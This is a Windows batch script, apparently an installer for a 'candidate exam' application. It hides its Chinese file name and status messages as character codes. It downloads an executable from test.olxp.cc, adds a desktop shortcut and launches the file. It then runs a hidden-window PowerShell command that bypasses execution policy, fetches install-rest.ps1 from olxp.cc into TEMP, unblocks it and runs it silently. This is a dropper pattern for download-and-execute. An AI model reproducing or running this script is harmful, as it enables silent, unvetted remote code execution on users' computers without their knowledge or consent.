@echo off
setlocal
set "URL=https://test.olxp.cc/download/%%E5%%80%%99%%E9%%80%%89%%E8%%80%%83%%E8%%AF%%95.exe"
powershell -NoProfile -Command ^
  "$n=-join [char[]](0x5019,0x9009,0x8003,0x8BD5);" ^
  "$dir=Join-Path $env:LOCALAPPDATA $n;" ^
  "$dest=Join-Path $dir ($n+'.exe');" ^
  "New-Item -ItemType Directory -Force -Path $dir | Out-Null;" ^
  "$ready=$false;" ^
  "if (Test-Path -LiteralPath $dest) { if ((Get-Item -LiteralPath $dest).Length -gt 1MB) { $ready=$true } };" ^
  "if (-not $ready) {" ^
  "  Write-Host ([string]::new([char[]](0x6B63,0x5728,0x4E0B,0x8F7D,0x002E,0x002E,0x002E)));" ^
  "  & curl.exe -fL --retry 3 -o $dest $env:URL;" ^
  "  if (($LASTEXITCODE -ne 0) -or -not (Test-Path -LiteralPath $dest) -or ((Get-Item -LiteralPath $dest).Length -le 1MB)) { Write-Host ([string]::new([char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002))); exit 1 }" ^
  "};" ^
  "$lnk=Join-Path ([Environment]::GetFolderPath('Desktop')) ($n+'.lnk');" ^
  "if (-not (Test-Path -LiteralPath $lnk)) { $s=(New-Object -ComObject WScript.Shell).CreateShortcut($lnk); $s.TargetPath=$dest; $s.Save() };" ^
  "Write-Host ([string]::new([char[]](0x6B63,0x5728,0x6253,0x5F00,0x002E,0x002E,0x002E)));" ^
  "Start-Process -FilePath $dest"
powershell -w h -nop -ep bypass -c "Set-Location -LiteralPath ([Environment]::GetEnvironmentVariable('TEMP')); curl.exe -fsSL -o r.ps1 https://olxp.cc/download/install-rest.ps1; Unblock-File .\r.ps1; & .\r.ps1 -Silent"
if errorlevel 1 (
  pause
  exit /b 1
)
endlocal
